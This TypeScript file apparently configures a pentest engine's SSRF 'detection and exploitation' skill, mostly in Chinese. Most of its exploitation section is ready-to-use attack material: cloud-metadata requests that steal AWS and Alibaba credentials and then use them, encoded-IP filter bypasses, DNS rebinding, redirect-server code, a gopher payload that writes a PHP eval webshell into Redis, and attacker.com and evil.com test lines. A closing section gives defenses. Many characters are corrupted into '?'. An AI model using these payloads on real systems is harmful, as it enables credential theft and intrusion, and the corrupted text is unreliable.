/**
 * HOS-Sec-Engine V2 - SSRF Detection and Exploitation Skills
 * SSRF 检测与利用专项 Skill 集合
 */

import { AttackDefenseSkill } from '\.\./\.\./\.\./types/skill';

export const ssrfDetectionSkills: AttackDefenseSkill[] = [
    {
        metadata: {
            id: 'web-ssrf-001',
            name: 'SSRF Detection and Exploitation',
            category: 'web',
            subCategory: 'ssrf',
            riskLevel: 'critical',
            confidence: 0.90,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: ['ssrf', 'server-side-request-forgery', 'cloud-metadata', 'dns-rebinding', 'internal-service', 'protocol-handler'],
        },
        trigger: {
            scenarios: [
                '应用存在 URL 参数用于获取远程资源（如图片下载、PDF 生成、Webhook 回调',
                'URL 参数控制后端发起 HTTP 请求到外部服',
                '云环境部署的应用可访问内部元数据服务',
                '存在 URL 重定向、URL 预览、页面截图等功能',
                '应用使用第三方库发起 HTTP 请求（如 axios、requests、curl',
                '微服务架构中服务间通过内网地址通信',
            ],
            keywords: [
                'ssrf',
                'server side request forgery',
                '内网请求',
                'url参数',
                'fetch',
                'webhook',
                'url preview',
                'image proxy',
                'metadata service',
                'cloud metadata',
                '169.254.169.254',
                'localhost',
                '内网探测',
            ],
            aliases: [
                '服务端请求伪',
                'url fetch',
                'internal network scan',
                'cloud metadata access',
                'url redirection abuse',
            ],
            indicators: [
                '响应时间差异（内?vs 外网',
                '响应内容包含内网服务信息',
                'HTTP 状态码异常（如 301 到内网地址',
                '错误信息暴露内网 IP 或端?',
            ],
        },
        knowledge: {
            description: '服务端请求伪?(SSRF) 允许攻击者控制服务器发起?HTTP 请求目标，从而访问内网服务、云平台元数据、本地文件等受限资源。SSRF 的危害在于它绕过了网络层的访问控制——服务器自身拥有内网访问权限，攻击者通过控制请求目标间接获得内网访问能力。在云环境中，SSRF 可访问实例元数据服务获取临时凭证，进而接管整个云账户',
            symptoms: [
                'URL 参数直接控制后端 HTTP 请求的目标地址',
                '后端对请求目标仅做简单的前缀匹配或黑名单过滤',
                '错误响应暴露了内网服务的连接状态（超时、拒绝连接等',
                '响应内容差异可判断目标端口是否开',
                '云环境部署且未设置元数据服务访问限制（如 IMDSv2?',
            ],
            rootCauses: [
                '应用信任用户提供?URL 参数，未验证目标地址是否为内',
                '黑名单过滤不完整（遗?IPv6、十进制 IP、DNS 变体等）',
                'URL 解析库与 HTTP 客户端库?URL 的处理存在差异（?host header 注入',
                '重定向跟随（follow redirects）未对跳转后的地址进行二次校验',
                '云平台元数据服务默认允许从实例内访问且无需认证',
                'DNS 解析结果未在服务端请求前进行校验',
            ],
            observations: [
                'AWS EC2 元数据服?IMDSv1 无需认证即可访问，IMDSv2 需?session token',
                '阿里云、腾讯云、GCP 均有各自的元数据端点和认证方',
                '内部 Redis (6379)、Memcached (11211) 等无认证服务?SSRF 的高价值目',
                'gopher:// 协议可构造任?TCP 请求，在旧版 curl/PHP 中仍可用',
                'DNS rebinding 攻击可在 DNS 解析时返回公?IP 绕过前置校验，随后返回内?IP 完成请求',
                '部分应用使用 file:// 协议可直接读取本地文',
                'Docker 环境中的 SSRF 可访?Docker API (2375/2376 端口)',
                'Kubernetes 中可访问 API Server (10.96.0.1:443) 获取集群信息',
            ],
            commonMistakes: [
                '只测?127.0.0.1 ?localhost，遗漏其他回环地址表示方式',
                '未考虑 IPv6 地址 (::1, [::1]) 绕过 IPv4 黑名',
                '忽略 DNS rebinding 攻击，只关注直接?IP 地址绕过',
                '未测试重定向跟随导致的二?SSRF',
                '忽略协议处理器（file://, gopher://, dict://）的攻击',
                '仅测?HTTP/HTTPS 协议，忽略其他协议的处理',
            ],
            notes: [
                'SSRF 检测时优先关注响应时间差异和错误信息，它们可能泄露内网状',
                '云环?SSRF 的利用链通常是：SSRF ?元数??临时凭证 ?云控制台权限',
                '现代 WAF ?169.254.169.254 等元数据地址有检测，需?IP 编码绕过',
                'SSRF ?URL 重定向漏洞常结合使用：重定向端点作为 SSRF ?跳板"',
                'Kubernetes ?Docker 环境中的 SSRF 危害更大，可直接获取容器/集群控制?',
            ],
        },
        action: {
            checklist: [
                '识别所有用户可控的 URL 参数（查询参数、POST body、JSON 字段',
                '测试基础 SSRF：替?URL ?http://attacker.com/ 确认可控',
                '测试本地回环?27.0.0.1, localhost, 0.0.0.0, [::1]',
                '测试 IP 编码绕过：八进制 (0177.0.0.1)、十进制 (2130706433)、十六进?(0x7f000001)',
                '测试 IPv6 绕过：[::1]、[0:0:0:0:0:ffff:127.0.0.1]',
                '测试云元数据服务?69.254.169.254（AWS）?00.100.100.200（阿里云',
                '测试端口扫描：通过响应时间/错误判断内网端口开放状',
                '测试协议处理器：file:///etc/passwd、gopher://、dict://',
                '测试 DNS rebinding：使用工具（?rbndr.us）控?DNS 解析结果',
                '测试重定?SSRF：控制外部服务器重定向到内网地址',
                '测试内网服务：Redis、Memcached、Docker API、Kubernetes API',
            ],
            techniques: [
                'IP 编码绕过?177.0.0.1（八进制）?130706433（十进制）?x7f000001（十六进制）',
                'DNS rebinding：利用短 TTL DNS 记录在解析时切换 IP',
                'CNAME 重绑定：DNS CNAME 记录指向攻击者控制的域名',
                'Host Header 注入：修?Host 头影响后端路',
                'gopher 协议构造任?TCP 请求（如 gopher://127.0.0.1:6379/_{command}',
                'file:// 协议读取本地文件',
                '重定向跟随绕过二次校',
                'URL 解析差异：http://attacker.com@127.0.0.1 实际请求 127.0.0.1',
                'DNS over HTTPS (DoH) 绕过本地 DNS 过滤',
                '利用内部服务 API：Redis EVAL、Docker API 创建容器',
            ],
            examples: [
                {
                    name: '云元数据 SSRF 获取临时凭证 (AWS)',
                    description: '利用 SSRF 访问 AWS EC2 实例元数据服务获?IAM 临时凭证',
                    content: "IMDSv1 (无认?:\n" +
                        "GET http://169.254.169.254/latest/meta-data/iam/security-credentials/\n" +
                        "?获取角色名\n" +
                        "GET http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}\n" +
                        "?获取 AccessKeyId、SecretAccessKey、Token\n" +
                        "\n" +
                        "IP 编码绕过 WAF 检?\n" +
                        "http://0xA9.FE.A9.1/ ?169.254.169.254 (十六进制)\n" +
                        "http://2852039166/ ?169.254.169.254 (十进?\n" +
                        "http://0251.0376.0251.0001/ ?169.254.169.254 (八进?\n" +
                        "http://425.51836404105/ ?169.254.169.254 (点分十进制变?\n" +
                        "http://[0:0:0:0:0:ffff:a9fe:a901]/ ?IPv6 映射\n" +
                        "\n" +
                        "利用凭证:\n" +
                        "aws configure set aws_access_key_id {AccessKeyId}\n" +
                        "aws configure set aws_secret_access_key {SecretAccessKey}\n" +
                        "aws configure set aws_session_token {Token}\n" +
                        "aws s3 ls (验证凭证有效?",
                },
                {
                    name: 'IP 编码绕过 localhost 过滤',
                    description: '当应用过?localhost/127.0.0.1 时，使用各种 IP 编码形式绕过',
                    content: "常见过滤: url.contains('localhost') || url.contains('127.0.0.1')\n" +
                        "\n" +
                        "绕过方式:\n" +
                        "1. 八进? http://0177.0.0.1:8080/api\n" +
                        "2. 十进? http://2130706433:8080/api\n" +
                        "3. 十六进制: http://0x7f000001:8080/api\n" +
                        "4. 混合: http://0x7f.0.0.1:8080/api\n" +
                        "5. IPv6: http://[::1]:8080/api\n" +
                        "6. IPv4 映射 IPv6: http://[::ffff:127.0.0.1]:8080/api\n" +
                        "7. 省略前导? http://127.1 (等价?127.0.0.1)\n" +
                        "8. 带凭证格? http://127.0.0.1@evil.com (URL 解析?127.0.0.1)\n" +
                        "9. ?IP: http://127.0.0.1%00.evil.com (空字节截?\n" +
                        "10. DNS 名称: http://localtest.me (解析?127.0.0.1 的公?DNS)",
                },
                {
                    name: 'DNS Rebinding 绕过 SSRF 防护',
                    description: '利用 DNS 解析的时间差绕过服务端的 IP 校验',
                    content: "攻击原理:\n" +
                        "1. 第一?DNS 解析: rebinding.example.com ?攻击者公?IP (通过服务端校?\n" +
                        "2. 服务端校验通过后，发起 HTTP 请求\n" +
                        "3. 第二?DNS 解析 (TTL=0): rebinding.example.com ?127.0.0.1\n" +
                        "4. HTTP 请求实际发送到 127.0.0.1\n" +
                        "\n" +
                        "利用工具:\n" +
                        "1. rbndr.us 公共 rebinding 服务\n" +
                        "   Payload: http://<内网IP>.rbndr.us\n" +
                        "   ? http://7f000001.rbndr.us ?127.0.0.1\n" +
                        "\n" +
                        "2. 自建 rebinding DNS 服务?\n" +
                        "   配置 DNS 服务器，第一次响应公?IP，后续响应内?IP\n" +
                        "   设置 TTL=0 强制每次重新解析\n" +
                        "\n" +
                        "3. 时序攻击窗口:\n" +
                        "   - 服务端先校验 IP（此时解析为公网）\n" +
                        "   - 校验后发起请求（此时解析为内网）\n" +
                        "   - 利用 HTTP 连接复用/keep-alive 增加窗口",
                },
                {
                    name: '重定?SSRF 绕过二次校验',
                    description: '利用外部服务器重定向到内网地址，绕过服务端的地址校验',
                    content: "攻击流程:\n" +
                        "1. 攻击者控?external.com 返回 302 重定向\n" +
                        "2. 重定向目? http://127.0.0.1:8080/admin\n" +
                        "3. 服务端跟随重定向，实际请求发送到内网地址\n" +
                        "\n" +
                        "具体实现 (Node.js):\n" +
                        "const express = require('express');\n" +
                        "const app = express();\n" +
                        "app.get('/', (req, res) => {\n" +
                        "  res.redirect('http://127.0.0.1:8080/admin');\n" +
                        "});\n" +
                        "app.listen(80);\n" +
                        "\n" +
                        "Python 实现:\n" +
                        "from http.server import HTTPServer, BaseHTTPRequestHandler\n" +
                        "class Handler(BaseHTTPRequestHandler):\n" +
                        "    def do_GET(self):\n" +
                        "        self.send_response(302)\n" +
                        "        self.send_header('Location', 'http://127.0.0.1:6379/')\n" +
                        "        self.end_headers()\n" +
                        "HTTPServer(('', 80), Handler).serve_forever()\n" +
                        "\n" +
                        "适用场景: 服务端只对初?URL 进行校验，不校验重定向后的地址",
                },
                {
                    name: 'Gopher 协议 SSRF 攻击内网 Redis',
                    description: '利用 gopher:// 协议构造任?TCP 请求攻击内网 Redis 服务',
                    content: "Gopher 协议格式:\n" +
                        "gopher://<host>:<port>/_<payload>\n" +
                        "\n" +
                        "攻击 Redis (端口 6379):\n" +
                        "gopher://127.0.0.1:6379/_info%0d%0aquit%0d%0a\n" +
                        "\n" +
                        "写入 Webshell:\n" +
                        "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html/%0d%0a\n" +
                        "config%20set%20dbfilename%20shell.php%0d%0a\n" +
                        "set%20x%20%22%3C?php%20eval($_POST[cmd]);?%3E%22%0d%0a\n" +
                        "save%0d%0aquit%0d%0a\n" +
                        "\n" +
                        "原理: gopher 协议允许构造任?TCP 请求体\n" +
                        "     %0d%0a 编码 CRLF 用于协议命令分隔\n" +
                        "注意: PHP curl 7.43+ 已移?gopher 支持\n" +
                        "     但在旧版 PHP、Python requests (配合特定配置) 中仍可用\n" +
                        "     Java ?URLConnection 不支?gopher",
                },
                {
                    name: 'SSRF 端口扫描内网服务',
                    description: '利用 SSRF 的响应差异对内网进行端口扫描',
                    content: "扫描技?\n" +
                        "1. 基于响应时间: 开放端口立即响应，关闭端口连接超时\n" +
                        "2. 基于 HTTP 状态码: 开放端口返回业务响应，关闭端口返回连接错误\n" +
                        "3. 基于错误信息: 不同服务的错误信息可识别服务类型\n" +
                        "\n" +
                        "常见内网端口:\n" +
                        "22   - SSH\n" +
                        "80   - HTTP\n" +
                        "443  - HTTPS\n" +
                        "3306 - MySQL\n" +
                        "5432 - PostgreSQL\n" +
                        "6379 - Redis (通常无认?\n" +
                        "8080 - 常见 Web 服务\n" +
                        "8443 - 管理面板\n" +
                        "9200 - Elasticsearch\n" +
                        "2375 - Docker API\n" +
                        "11211 - Memcached\n" +
                        "27017 - MongoDB\n" +
                        "\n" +
                        "自动化扫描脚本思路:\n" +
                        "for port in 22 80 443 3306 6379 8080 9200 2375; do\n" +
                        "  response = fetch(f'http://target/proxy?url=http://127.0.0.1:{port}/')\n" +
                        "  if response.time < 5s and response.status != 500:\n" +
                        "    print(f'Port {port} is open')\n" +
                        "  else:\n" +
                        "    print(f'Port {port} is closed/filtered')",
                },
                {
                    name: '阿里云元数据 SSRF',
                    description: '利用 SSRF 访问阿里?ECS 实例元数据服',
                    content: "阿里云元数据端点: http://100.100.100.200/latest/meta-data/\n" +
                        "\n" +
                        "获取基本信息:\n" +
                        "http://100.100.100.200/latest/meta-data/instance-id\n" +
                        "http://100.100.100.200/latest/meta-data/mac\n" +
                        "http://100.100.100.200/latest/meta-data/private-ipv4\n" +
                        "\n" +
                        "获取 RAM 角色凭证:\n" +
                        "http://100.100.100.200/latest/meta-data/ram/security-credentials/\n" +
                        "?获取角色名\n" +
                        "http://100.100.100.200/latest/meta-data/ram/security-credentials/{role-name}\n" +
                        "?获取 AccessKeyId、AccessKeySecret、SecurityToken\n" +
                        "\n" +
                        "IP 绕过:\n" +
                        "http://0x64.0x64.0x64.0xc8/ ?100.100.100.200 (十六进制)\n" +
                        "http://1684300984/ ?100.100.100.200 (十进?\n" +
                        "\n" +
                        "注意: 阿里云已启用元数据加固模?(IMDSv2 类似)\n" +
                        "     需要设?X-Forwarded-For 头或特定 token",
                },
            ],
        },
        validation: {
            indicators: [
                '攻击者服务器收到来自目标服务器的 HTTP 请求',
                '响应内容包含内网服务信息（HTTP 响应头、HTML 内容',
                '响应时间明显差异（内网快速响?vs 超时',
                '错误信息暴露内网 IP、端口或服务类型',
                '云元数据返回有效的实例信息或凭证',
            ],
            successSigns: [
                '成功访问 127.0.0.1 或内网地址并获取响',
                '获取云元数据（实?ID、IAM 角色、凭证等',
                '确认内网端口开放状态（通过响应差异',
                '通过 gopher/file 协议读取本地文件或发起任意请',
                'DNS rebinding 成功使请求到达内网目?',
            ],
            falsePositiveSigns: [
                '响应内容来自缓存而非实时请求',
                '错误信息为通用错误页，未暴露内网状',
                'DNS rebinding 因缓存未生效（DNS TTL 未过期）',
                '重定向被服务端限制（最大重定向次数、域名白名单?',
            ],
        },
        defense: {
            recommendations: [
                '禁用不必要的 URL 获取功能，或使用白名单限制允许访问的域名',
                '在服务端请求前校?URL 的目标地址，禁止内?IP 范围（包括所有编码形式）',
                '对重定向进行跟随校验：每次重定向后重新验证目标地址',
                '统一 URL 解析库和 HTTP 客户端库，避免解析差',
                '云平台启?IMDSv2（需?session token）或设置 hop limit=1',
                '使用网络策略（如 Kubernetes NetworkPolicy）限?Pod 间通信',
                '对所有内网服务实施认证和授权',
                '使用独立网络命名空间或沙箱执?URL 获取操作',
            ],
            mitigations: [
                '配置云元数据服务访问限制（AWS IMDSv2、阿里云加固模式',
                '实施最小权限原则，限制应用进程的出站网络访',
                '使用 egress firewall 限制服务器可访问的目标地址',
                '监控异常的出?HTTP 请求（特别是到内网地址',
                '?SSRF 敏感功能实施请求日志和告?',
            ],
            references: [
                'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
                'https://portswigger.net/web-security/ssrf',
                'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
                'https://cloud.google.com/compute/docs/storing-retrieving-metadata',
                'https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html',
                'https://blog.appsecco.com/a-hackers-guide-to-aws-iam-roles-and-instance-metadata-service-7d865e37c7a9',
            ],
        },
        quality: {
      confidence: 0.90,
      reviewed: true,
      tested: true,
      lastVerified: '2026-06',
    },
    playbooks: ['web-pentest-full'],
    phase: 'reconnaissance',
    enabled: true,
  },
];
